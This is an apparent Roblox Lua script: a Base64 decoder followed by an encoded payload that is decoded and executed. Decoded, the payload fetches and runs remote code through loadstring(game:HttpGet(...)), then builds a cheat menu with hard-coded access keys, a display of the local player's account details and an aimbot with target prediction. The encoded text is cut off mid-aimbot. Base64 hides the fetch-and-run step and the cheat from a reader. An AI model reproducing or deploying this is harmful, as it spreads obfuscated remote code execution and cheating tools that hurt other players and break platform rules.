-- Base64 解码器（Roblox 可用）
local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local b64lookup = {}
for i = 1, #b64chars do
    b64lookup[b64chars:sub(i, i)] = i - 1
end

local function base64_decode(data)
    data = data:gsub('[^%w%+%/%=]', '')
    local result = {}
    local n = 1
    while n <= #data do
        local a = b64lookup[data:sub(n, n)]
        local b = b64lookup[data:sub(n+1, n+1)]
        local c = b64lookup[data:sub(n+2, n+2)]
        local d = b64lookup[data:sub(n+3, n+3)]

        local x = (a * 262144) + (b * 4096) + ((c or 0) * 64) + (d or 0)
        result[#result+1] = string.char(
            math.floor(x / 65536) % 256,
            math.floor(x / 256) % 256,
            x % 256
        )
        n = n + 4
    end

    local pad = select(2, data:gsub('=', '='))
    if pad == 2 then
        result[#result] = result[#result]:sub(1, 1)
    elseif pad == 1 then
        result[#result] = result[#result]:sub(1, 2)
    end

    return table.concat(result)
end

-- ✅ 示例：解码并执行（仅限你自己的脚本）
local decoded = base64_decode("bG9jYWwgUmF5ZmllbGQgPSBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgnaHR0cHM6Ly9zaXJpdXMubWVudS9yYXlmaWVsZCcpKSgpCgotLSDkvb/nlKggUmF5ZmllbGQg5YaF572u5a+G6ZKl57O757ufCmxvY2FsIFdpbmRvdyA9IFJheWZpZWxkOkNyZWF0ZVdpbmRvdyh7CiAgICBOYW1lID0gIuWdpOWdpOWkp+W4neiEmuacrCAtICIgLi4gKGlkZW50aWZ5ZXhlY3V0b3IgYW5kIGlkZW50aWZ5ZXhlY3V0b3IoKSBvciAi5pyq55+l5omn6KGM5ZmoIiksCiAgICBMb2FkaW5nVGl0bGUgPSAi5Z2k5Z2k5aSn5bid6ISa5pys5Yqg6L295LitIiwKICAgIExvYWRpbmdTdWJ0aXRsZSA9ICLlsIrkuqvnibnmnYPniYgiLAogICAgQ29uZmlndXJhdGlvblNhdmluZyA9IHsKICAgICAgICBFbmFibGVkID0gdHJ1ZSwKICAgICAgICBGb2xkZXJOYW1lID0gIlN0aXRjaENvbmZpZyIsCiAgICAgICAgRmlsZU5hbWUgPSAiU2V0dGluZ3MiCiAgICB9LAogICAgRGlzY29yZCA9IHsKICAgICAgICBFbmFibGVkID0gZmFsc2UsCiAgICAgICAgSW52aXRlID0gImh0dHBzOi8vZGlzY29yZC5nZy8iLAogICAgICAgIFJlbWVtYmVySm9pbnMgPSB0cnVlCiAgICB9LAogICAgS2V5U3lzdGVtID0gdHJ1ZSwgLS0g5ZCv55So5YaF572u5a+G6ZKl57O757ufCiAgICBLZXlTZXR0aW5ncyA9IHsKICAgICAgICBUaXRsZSA9ICLlnaTlnaTlpKfluJ3ohJrmnKzpqozor4EiLAogICAgICAgIFN1YnRpdGxlID0gIuivt+i+k+WFpeacieaViOWvhumSpSIsCiAgICAgICAgTm90ZSA9ICLmsqHmnInlr4bpkqXvvJ/liqDlhaVEaXNjb3Jk6I635Y+WIiwKICAgICAgICBGaWxlTmFtZSA9ICJTdGl0Y2hLZXkiLAogICAgICAgIFNhdmVLZXkgPSB0cnVlLAogICAgICAgIEdyYWJLZXlGcm9tU2l0ZSA9IGZhbHNlLAogICAgICAgIEtleSA9IHsiMjAyNSIsICI2NjYiLCAiS1VOS1VONjY2IiwgIjY2NmZyZWUiLCAiVEFJWU9VWUlTSUxFIn0gLS0g5pyJ5pWI5a+G6ZKl5YiX6KGoCiAgICB9Cn0pCgotLSDlnaTlnaTlpKfluJ3ohJrmnKzlvLnmgKfliqjnlLsKbG9jYWwgZnVuY3Rpb24gQ3JlYXRlS3VuS3VuQW5pbWF0aW9uKCkKICAgIC0tIOWIm+W7uuWFqOWxj+iDjOaZrwogICAgbG9jYWwgYmcgPSBEcmF3aW5nLm5ldygiU3F1YXJlIikKICAgIGJnLlNpemUgPSB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5WaWV3cG9ydFNpemUKICAgIGJnLlBvc2l0aW9uID0gVmVjdG9yMi5uZXcoMCwgMCkKICAgIGJnLkNvbG9yID0gQ29sb3IzLm5ldygwLCAwLCAwKQogICAgYmcuRmlsbGVkID0gdHJ1ZQogICAgYmcuVHJhbnNwYXJlbmN5ID0gMQogICAgYmcuVmlzaWJsZSA9IHRydWUKICAgIGJnLlpJbmRleCA9IDk5OQogICAgCiAgICAtLSDliJvlu7rlnaTlnaTlpKfluJ3mloflrZcKICAgIGxvY2FsIHRleHQgPSBEcmF3aW5nLm5ldygiVGV4dCIpCiAgICB0ZXh0LlRleHQgPSAi5Z2k5Z2k5aSn5bid6ISa5pysIgogICAgdGV4dC5TaXplID0gMTAwCiAgICB0ZXh0LkNlbnRlciA9IHRydWUKICAgIHRleHQuUG9zaXRpb24gPSBWZWN0b3IyLm5ldyh3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5WaWV3cG9ydFNpemUuWC8yLCAtMjAwKQogICAgdGV4dC5Db2xvciA9IENvbG9yMy5uZXcoMSwgMC4yLCAwLjIpCiAgICB0ZXh0Lk91dGxpbmUgPSB0cnVlCiAgICB0ZXh0Lk91dGxpbmVDb2xvciA9IENvbG9yMy5uZXcoMSwgMSwgMSkKICAgIHRleHQuVHJhbnNwYXJlbmN5ID0gMAogICAgdGV4dC5WaXNpYmxlID0gdHJ1ZQogICAgdGV4dC5aSW5kZXggPSAxMDAwCiAgICAKICAgIC0tIOWIm+W7uuWJr+agh+mimAogICAgbG9jYWwgc3ViVGV4dCA9IERyYXdpbmcubmV3KCJUZXh0IikKICAgIHN1YlRleHQuVGV4dCA9ICLlsIrkuqvnibnmnYPniYggLSDlkK/liqjmiJDlip8iCiAgICBzdWJUZXh0LlNpemUgPSA0MAogICAgc3ViVGV4dC5DZW50ZXIgPSB0cnVlCiAgICBzdWJUZXh0LlBvc2l0aW9uID0gVmVjdG9yMi5uZXcod29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuVmlld3BvcnRTaXplLlgvMiwgLTEwMCkKICAgIHN1YlRleHQuQ29sb3IgPSBDb2xvcjMubmV3KDAuOCwgMC44LCAxKQogICAgc3ViVGV4dC5PdXRsaW5lID0gdHJ1ZQogICAgc3ViVGV4dC5PdXRsaW5lQ29sb3IgPSBDb2xvcjMubmV3KDAuMiwgMC4yLCAwLjIpCiAgICBzdWJUZXh0LlRyYW5zcGFyZW5jeSA9IDAKICAgIHN1YlRleHQuVmlzaWJsZSA9IHRydWUKICAgIHN1YlRleHQuWkluZGV4ID0gMTAwMAogICAgCiAgICAtLSDlvLnmgKfliqjnlLvlh73mlbAKICAgIGxvY2FsIGZ1bmN0aW9uIGVsYXN0aWNBbmltYXRpb24ob2JqLCB0YXJnZXRZLCBkdXJhdGlvbikKICAgICAgICBsb2NhbCBzdGFydFkgPSBvYmouUG9zaXRpb24uWQogICAgICAgIGxvY2FsIHN0YXJ0VGltZSA9IHRpY2soKQogICAgICAgIGxvY2FsIGRhbXBpbmcgPSAwLjcKICAgICAgICBsb2NhbCBzdGlmZm5lc3MgPSAwLjMKICAgICAgICAKICAgICAgICBsb2NhbCBjb25uZWN0aW9uCiAgICAgICAgY29ubmVjdGlvbiA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLlJlbmRlclN0ZXBwZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIGVsYXBzZWQgPSB0aWNrKCkgLSBzdGFydFRpbWUKICAgICAgICAgICAgbG9jYWwgcHJvZ3Jlc3MgPSBlbGFwc2VkIC8gZHVyYXRpb24KICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIHByb2dyZXNzID49IDEgdGhlbgogICAgICAgICAgICAgICAgb2JqLlBvc2l0aW9uID0gVmVjdG9yMi5uZXcob2JqLlBvc2l0aW9uLlgsIHRhcmdldFkpCiAgICAgICAgICAgICAgICBjb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgb3ZlcnNob290ID0gbWF0aC5zaW4ocHJvZ3Jlc3MgKiBtYXRoLnBpICogNCkgKiAoMSAtIHByb2dyZXNzKQogICAgICAgICAgICBsb2NhbCBuZXdZID0gdGFyZ2V0WSArIChzdGFydFkgLSB0YXJnZXRZKSAqIG1hdGgucG93KDEgLSBwcm9ncmVzcywgMikgKiBvdmVyc2hvb3QgKiBzdGlmZm5lc3MKICAgICAgICAgICAgc3RpZmZuZXNzID0gc3RpZmZuZXNzICogZGFtcGluZwogICAgICAgICAgICBvYmouUG9zaXRpb24gPSBWZWN0b3IyLm5ldyhvYmouUG9zaXRpb24uWCwgbmV3WSkKICAgICAgICBlbmQpCiAgICBlbmQKICAgIAogICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIGZvciBpID0gMCwgMSwgMC4wNSBkbwogICAgICAgICAgICBiZy5UcmFuc3BhcmVuY3kgPSAxIC0gaSAqIDAuNwogICAgICAgICAgICB3YWl0KDAuMDEpCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgZWxhc3RpY0FuaW1hdGlvbih0ZXh0LCB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5WaWV3cG9ydFNpemUuWS8yIC0gMTAwLCAxLjUpCiAgICAgICAgCiAgICAgICAgd2FpdCgwLjIpCiAgICAgICAgZWxhc3RpY0FuaW1hdGlvbihzdWJUZXh0LCB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5WaWV3cG9ydFNpemUuWS8yICsgMjAsIDEuMykKICAgICAgICAKICAgICAgICB3YWl0KDMuNSkKICAgICAgICAKICAgICAgICBmb3IgaSA9IDAsIDEsIDAuMDUgZG8KICAgICAgICAgICAgdGV4dC5UcmFuc3BhcmVuY3kgPSBpCiAgICAgICAgICAgIHN1YlRleHQuVHJhbnNwYXJlbmN5ID0gaQogICAgICAgICAgICBiZy5UcmFuc3BhcmVuY3kgPSAwLjMgKyBpICogMC43CiAgICAgICAgICAgIHdhaXQoMC4wMSkKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBiZzpSZW1vdmUoKQogICAgICAgIHRleHQ6UmVtb3ZlKCkKICAgICAgICBzdWJUZXh0OlJlbW92ZSgpCiAgICBlbmQpCmVuZAoKLS0g5aSN5Yi25Yiw5Ymq6LS05p2/5Ye95pWwCmxvY2FsIGZ1bmN0aW9uIENvcHlUb0NsaXBib2FyZCh0ZXh0KQogICAgaWYgc2V0Y2xpcGJvYXJkIHRoZW4KICAgICAgICBzZXRjbGlwYm9hcmQodGV4dCkKICAgICAgICByZXR1cm4gdHJ1ZQogICAgZWxzZWlmIHdyaXRlY2xpcGJvYXJkIHRoZW4KICAgICAgICB3cml0ZWNsaXBib2FyZCh0ZXh0KQogICAgICAgIHJldHVybiB0cnVlCiAgICBlbHNlaWYgdG9jbGlwYm9hcmQgdGhlbgogICAgICAgIHRvY2xpcGJvYXJkKHRleHQpCiAgICAgICAgcmV0dXJuIHRydWUKICAgIGVsc2UKICAgICAgICBwcmludCgiW+WkjeWItuWGheWuuV0gIiAuLiB0ZXh0KQogICAgICAgIHJldHVybiBmYWxzZQogICAgZW5kCmVuZAoKLS0g5pi+56S65aSN5Yi25oiQ5Yqf6YCa55+lCmxvY2FsIGZ1bmN0aW9uIFNob3dDb3B5Tm90aWZpY2F0aW9uKHN1Y2Nlc3MsIGNvbnRlbnQpCiAgICBpZiBzdWNjZXNzIHRoZW4KICAgICAgICBSYXlmaWVsZDpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICLlpI3liLbmiJDlip8iLAogICAgICAgICAgICBDb250ZW50ID0gIuW3suWkjeWItuWIsOWJqui0tOadvzogIiAuLiBjb250ZW50LAogICAgICAgICAgICBEdXJhdGlvbiA9IDMsCiAgICAgICAgICAgIEltYWdlID0gNDQ4MzM2MjQ1OAogICAgICAgIH0pCiAgICBlbHNlCiAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAi5aSN5Yi25aSx6LSlIiwKICAgICAgICAgICAgQ29udGVudCA9ICLor7fmiYvliqjlpI3liLbmjqfliLblj7DkuK3nmoTlhoXlrrkiLAogICAgICAgICAgICBEdXJhdGlvbiA9IDUsCiAgICAgICAgICAgIEltYWdlID0gNDQ4MzM2MjQ1OAogICAgICAgIH0pCiAgICBlbmQKZW5kCgotLSDliJvlu7rkuLvnqpflj6PlhoXlrrkKbG9jYWwgZnVuY3Rpb24gQ3JlYXRlTWFpbldpbmRvd0NvbnRlbnQoKQogICAgLS0g5YWs5ZGKIFRhYgogICAgbG9jYWwgVGFiMSA9IFdpbmRvdzpDcmVhdGVUYWIoIuWFrOWRiiIsIDc3MzM3Nzk2MTApCiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIGdldERhdGUoKSByZXR1cm4gb3MuZGF0ZSgiJVktJW0tJWQgJUg6JU0iKSBlbmQKICAgIGxvY2FsIGZ1bmN0aW9uIGdldFBsYXllcigpCiAgICAgICAgbG9jYWwgcCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIHJldHVybiB7CiAgICAgICAgICAgIFsi55So5oi35ZCNIl0gICA9IHAuTmFtZSwKICAgICAgICAgICAgWyLmmL7npLrlkI0iXSAgID0gcC5EaXNwbGF5TmFtZSwKICAgICAgICAgICAgWyLnlKjmiLdJRCJdICAgPSBwLlVzZXJJZCwKICAgICAgICAgICAgWyLms6jlhozlpKnmlbAiXSA9IHAuQWNjb3VudEFnZSwKICAgICAgICAgICAgWyLlvZPliY3muLjmiI8iXSA9IGdhbWU6R2V0U2VydmljZSgiTWFya2V0cGxhY2VTZXJ2aWNlIik6R2V0UHJvZHVjdEluZm8oZ2FtZS5QbGFjZUlkKS5OYW1lCiAgICAgICAgfQogICAgZW5kCiAgICAKICAgIFRhYjE6Q3JlYXRlU2VjdGlvbigi57O757uf5L+h5oGvIikKICAgIFRhYjE6Q3JlYXRlTGFiZWwoIvCfk4Ug5b2T5YmN5pe26Ze0OiAiIC4uIGdldERhdGUoKSkKICAgIAogICAgZm9yIGssIHYgaW4gcGFpcnMoZ2V0UGxheWVyKCkpIGRvCiAgICAgICAgVGFiMTpDcmVhdGVMYWJlbChrIC4uICLvvJogIiAuLiB0b3N0cmluZyh2KSkKICAgIGVuZAogICAgCiAgICBUYWIxOkNyZWF0ZUJ1dHRvbih7CiAgICAgICAgTmFtZSA9ICLkuIDplK7lpI3liLZRUeWPtyIsIAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKSAKICAgICAgICAgICAgbG9jYWwgc3VjY2VzcyA9IENvcHlUb0NsaXBib2FyZCgiOTEzMzQ4Mjg1IikKICAgICAgICAgICAgU2hvd0NvcHlOb3RpZmljYXRpb24oc3VjY2VzcywgIjkxMzM0ODI4NSIpCiAgICAgICAgZW5kCiAgICB9KQogICAgCiAgICAtLSDkurrnianlip/og70gVGFiCiAgICBsb2NhbCBUYWIyID0gV2luZG93OkNyZWF0ZVRhYigi5Lq654mp5Yqf6IO9IiwgNzczMzc3OTYxMCkKICAgIAogICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICAgIC0tIOWPjOeLrOeriyBGT1bvvIjnmb3ot5/pmo8gKyDmqZnlm7rlrprvvInpg73lj4LkuI7nnoTlh4bliKTlrpogLSDlop7lvLrniYgKICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAgICAtLSDpgJrnlKjlj4LmlbAKICAgIGxvY2FsIGFpbWJvdEVuYWJsZWQgICAgICA9IGZhbHNlCiAgICBsb2NhbCBhaW1ib3RTbW9vdGggICAgICAgPSAwLjM1CiAgICBsb2NhbCBhaW1ib3RCb25lICAgICAgICAgPSAiSGVhZCIKICAgIGxvY2FsIGFpbWJvdFByZWRpY3Rpb24gICA9IDAuMTIKICAgIGxvY2FsIGFpbWJvdENoZWNrVGVhbSAgICA9IGZhbHNlCiAgICBsb2NhbCBhaW1ib3RDb25uCiAgICBsb2NhbCBhaW1ib3RNb2RlID0gIkRpc3RhbmNlIgogICAgbG9jYWwgd2FsbENoZWNrRW5hYmxlZCA9IGZhbHNlCiAgICBsb2NhbCBhaW1MaW5lRW5hYmxlZCA9IGZhbHNlCiAgICBsb2NhbCBhaW1MaW5lID0gRHJhd2luZy5uZXcoIkxpbmUiKQogICAgCiAgICAtLSDliJ3lp4vljJboh6rnnoTnur/mnaEKICAgIGFpbUxpbmUuVmlzaWJsZSA9IGZhbHNlCiAgICBhaW1MaW5lLlRoaWNrbmVzcyA9IDEuNQogICAgYWltTGluZS5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDAsIDI1NSwgMCkKICAgIGFpbUxpbmUuWkluZGV4ID0gMTEKICAgIAogICAgLS0g57y65aSx5Y+Y6YeP5LiA5qyh5oCn6KGl5YWoCiAgICBsb2NhbCBDYW1lcmEgPSB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYQogICAgbG9jYWwgVXNlcklucHV0U2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpCiAgICBsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKICAgIGxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgogICAgCiAgICAtLSAxLiDot5/pmo/pvKDmoIcgRk9WCiAgICBsb2NhbCBtb3VzZUZPViAgICAgID0gMTIwCiAgICBsb2NhbCBtb3VzZUZvdkNpcmNsZSA9IERyYXdpbmcubmV3KCJDaXJjbGUiKQogICAgbW91c2VGb3ZDaXJjbGUuTnVtU2lkZXMgID0gNjQKICAgIG1vdXNlRm92Q2lyY2xlLlJhZGl1cyAgICA9IG1vdXNlRk9WCiAgICBtb3VzZUZvdkNpcmNsZS5UaGlja25lc3MgPSAxLjUKICAgIG1vdXNlRm92Q2lyY2xlLkNvbG9yICAgICA9IENvbG9yMy5mcm9tUkdCKDI1NSwyNTUsMjU1KQogICAgbW91c2VGb3ZDaXJjbGUuRmlsbGVkICAgID0gZmFsc2UKICAgIG1vdXNlRm92Q2lyY2xlLlZpc2libGUgICA9IGZhbHNlCiAgICBtb3VzZUZvdkNpcmNsZS5aSW5kZXggPSAxMAogICAgCiAgICAtLSAyLiDlm7rlrprkuK3lv4MgRk9WCiAgICBsb2NhbCBmaXhlZEZPViAgICAgID0gOTAKICAgIGxvY2FsIGZpeGVkRm92Q2lyY2xlID0gRHJhd2luZy5uZXcoIkNpcmNsZSIpCiAgICBmaXhlZEZvdkNpcmNsZS5OdW1TaWRlcyAgPSA2NAogICAgZml4ZWRGb3ZDaXJjbGUuUmFkaXVzICAgID0gZml4ZWRGT1YKICAgIGZpeGVkRm92Q2lyY2xlLlRoaWNrbmVzcyA9IDEuNQogICAgZml4ZWRGb3ZDaXJjbGUuQ29sb3IgICAgID0gQ29sb3IzLmZyb21SR0IoMjU1LDE2NSwwKQogICAgZml4ZWRGb3ZDaXJjbGUuRmlsbGVkICAgID0gZmFsc2UKICAgIGZpeGVkRm92Q2lyY2xlLlZpc2libGUgICA9IGZhbHNlCiAgICBmaXhlZEZvdkNpcmNsZS5aSW5kZXggPSA5CiAgICAKICAgIC0tIOWbuuWumuWchuS4reW/g+S4gOasoeiuvue9rgogICAgbG9jYWwgZnVuY3Rpb24gc2V0Rml4ZWRDZW50ZXIoKQogICAgICAgIGxvY2FsIGNlbnRlciA9IFZlY3RvcjIubmV3KENhbWVyYS5WaWV3cG9ydFNpemUuWC8yLCBDYW1lcmEuVmlld3BvcnRTaXplLlkvMikKICAgICAgICBmaXhlZEZvdkNpcmNsZS5Qb3NpdGlvbiA9IGNlbnRlcgogICAgICAgIC0tIOWIneWni+WMluiHqueehOe6v+adoeeahOi1t+eCuQogICAgICAgIGFpbUxpbmUuRnJvbSA9IGNlbnRlcgogICAgZW5kCiAgICBDYW1lcmE6R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCJWaWV3cG9ydFNpemUiKTpDb25uZWN0KHNldEZpeGVkQ2VudGVyKQogICAgc2V0Rml4ZWRDZW50ZXIoKQogICAgCiAgICAtLSDlt6Xlhbflh73mlbAKICAgIGxvY2FsIGZ1bmN0aW9uIGdldEFpbVBvcyhjaGFyYWN0ZXIpCiAgICAgICAgaWYgbm90IGNoYXJhY3RlciB0aGVuIHJldHVybiBuaWwgZW5kCiAgICAgICAgbG9jYWwgcm9vdCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgbG9jYWwgYm9uZSA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZChhaW1ib3RCb25lKSBvciBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKQogICAgICAgIGlmIG5vdCAocm9vdCBhbmQgYm9uZSkgdGhlbiByZXR1cm4gbmlsIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIHZlbCA9IHJvb3QuVmVsb2NpdHkKICAgICAgICByZXR1cm4gYm9uZS5Qb3NpdGlvbiArIHZlbCAqIGFpbWJvdFByZWRpY3Rpb24KICAgIGVuZAogICAgCiAgICBsb2NhbCBmdW5jdGlvbiBpc1Zpc2libGUocG9zLCB0YXJnZXRDaGFyYWN0ZXIpCiAgICAgICAgaWYgbm90IHdhbGxDaGVja0VuYWJsZWQgdGhlbiByZXR1cm4gdHJ1ZSBlbmQKICAgICAgICAKICAgICAgICBsb2NhbCBvcmlnaW4gPSBDYW1lcmEuQ0ZyYW1lLlBvc2l0aW9uCiAgICAgICAgbG9jYWwgZGlyZWN0aW9uID0gKHBvcyAtIG9yaWdpbikuVW5pdAogICAgICAgIGxvY2FsIHJheSA9IFJheS5uZXcob3JpZ2luLCBkaXJlY3Rpb24gKiAob3JpZ2luIC0gcG9zKS5NYWduaXR1ZGUpCiAgICAgICAgCiAgICAgICAgbG9jYWwgaWdub3JlTGlzdCA9IHtMb2NhbFBsYXllci5DaGFyYWN0ZXIsIENhbWVyYX0KICAgICAgICBpZiB0YXJnZXRDaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICB0YWJsZS5pbnNlcnQoaWdub3JlTGlzdCwgdGFyZ2V0Q2hhcmFjdGVyKQogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIHBhcnQsIHBvc2l0aW9uID0gd29ya3NwYWNlOkZpbmRQYXJ0T25SYXlXaXRoSWdub3JlTGlzdChyYXksIGlnbm9yZUxpc3QpCiAgICAgICAgcmV0dXJuIHBhcnQgPT0gbmlsCiAgICBlbmQKICAgIAogICAgbG9jYWwgZnVuY3Rpb24gaW5BbnlGT1Yod29ybGRQb3MpCiAgICAgICAgbG9jYWwgc2NyZWVuUG9zID0gQ2FtZXJhOldvcmxkVG9WaWV3cG9ydFBvaW50KHdvcmxkUG9zKQogICAgICAgIGlmIHNjcmVlblBvcy5aIDw9IDAgdGhlbiByZXR1cm4gZmFsc2UgZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgbW91c2VQb3MgPSBVc2VySW5wdXRTZXJ2aWNlOkdldE1vdXNlTG9jYXRpb24oKQogICAgICAgIGxvY2FsIGNlbnRlciA9IFZlY3RvcjIubmV3KENhbWVyYS5WaWV3cG9ydFNpemUuWC8yLCBDYW1lcmEuVmlld3BvcnRTaXplLlkvMikKICAgICAgICAKICAgICAgICBpZiBtb3VzZUZvdkNpcmNsZS5WaXNpYmxlIHRoZW4KICAgICAgICAgICAgaWYgKFZlY3RvcjIubmV3KHNjcmVlblBvcy5YLCBzY3JlZW5Qb3MuWSkgLSBtb3VzZVBvcykuTWFnbml0dWRlIDw9IG1vdXNlRk9WIHRoZW4KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGlmIGZpeGVkRm92Q2lyY2xlLlZpc2libGUgdGhlbgogICAgICAgICAgICBpZiAoVmVjdG9yMi5uZXcoc2NyZWVuUG9zLlgsIHNjcmVlblBvcy5ZKSAtIGNlbnRlcikuTWFnbml0dWRlIDw9IGZpeGVkRk9WIHRoZW4KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIHJldHVybiBmYWxzZQogICAgZW5kCiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIGdldENsb3Nlc3QoKQogICAgICAgIGxvY2FsIGNsb3Nlc3QsIG1pbkRpc3QgPSBuaWwsIG1hdGguaHVnZQogICAgICAgIGxvY2FsIGNlbnRlciA9IFZlY3RvcjIubmV3KENhbWVyYS5WaWV3cG9ydFNpemUuWC8yLCBDYW1lcmEuVmlld3BvcnRTaXplLlkvMikKICAgICAgICAKICAgICAgICBmb3IgXywgcGxyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgaWYgcGxyID09IExvY2FsUGxheWVyIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgIGlmIGFpbWJvdENoZWNrVGVhbSBhbmQgcGxyLlRlYW0gYW5kIHBsci5UZWFtID09IExvY2FsUGxheWVyLlRlYW0gdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGNoYXIgPSBwbHIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGlmIG5vdCBjaGFyIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBhaW1Qb3MgPSBnZXRBaW1Qb3MoY2hhcikKICAgICAgICAgICAgaWYgbm90IGFpbVBvcyB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICBpZiBub3QgaW5BbnlGT1YoYWltUG9zKSB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgc3AgPSBDYW1lcmE6V29ybGRUb1ZpZXdwb3J0UG9pbnQoYWltUG9zKQogICAgICAgICAgICBpZiBzcC5aIDw9IDAgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGlnbm9yZUxpc3QgPSB7TG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLCBDYW1lcmF9CiAgICAgICAgICAgIGlmIG5vdCBpc1Zpc2libGUoYWltUG9zLCBjaGFyKSB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgZGlzdAogICAgICAgICAgICBpZiBhaW1ib3RNb2RlID09ICJEaXN0YW5jZSIgdGhlbgogICAgICAgICAgICAgICAgZGlzdCA9IChhaW1Qb3MgLSBDYW1lcmEuQ0ZyYW1lLlBvc2l0aW9uKS5NYWduaXR1ZGUKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgZGlzdCA9IChWZWN0b3IyLm5ldyhzcC5YLCBzcC5ZKSAtIGNlbnRlcikuTWFnbml0dWRlCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgZGlzdCA8IG1pbkRpc3QgdGhlbgogICAgICAgICAgICAgICAgbWluRGlzdCwgY2xvc2VzdCA9IGRpc3QsIHBscgogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICByZXR1cm4gY2xvc2VzdAogICAgZW5kCiAgICAKICAgIC0tIOS4u+W+queOr++8iOWujOWFqOenu+mZpOS6huW8gOeBq+WKn+iDve+8iQogICAgbG9jYWwgZnVuY3Rpb24gc3RhcnRBaW1ib3QoKQogICAgICAgIGlmIGFpbWJvdENvbm4gdGhlbiByZXR1cm4gZW5kCiAgICAgICAgCiAgICAgICAgYWltYm90Q29ubiA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLlJlbmRlclN0ZXBwZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIG5vdCBhaW1ib3RFbmFibGVkIHRoZW4gCiAgICAgICAgICAgICAgICBhaW1MaW5lLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgcmV0dXJuIAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIG1vdXNlRm92Q2lyY2xlLlBvc2l0aW9uID0gVXNlcklucHV0U2VydmljZTpHZXRNb3VzZUxvY2F0aW9uKCkKCiAgICAgICAgICAgIGxvY2FsIHRhcmdldCA9IGdldENsb3Nlc3QoKQogICAgICAgICAgICBpZiBub3QgdGFyZ2V0IG9yIG5vdCB0YXJnZXQuQ2hhcmFjdGVyIHRoZW4gCiAgICAgICAgICAgICAgICBhaW1MaW5lLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgcmV0dXJuIAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGFpbVBvcyA9IGdldEFpbVBvcyh0YXJnZXQuQ2hhcmFjdGVyKQogICAgICAgICAgICBpZiBub3QgYWltUG9zIHRoZW4gCiAgICAgICAgICAgICAgICBhaW1MaW5lLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgcmV0dXJuIAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGlmIGFpbUxpbmVFbmFibGVkIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHNjcmV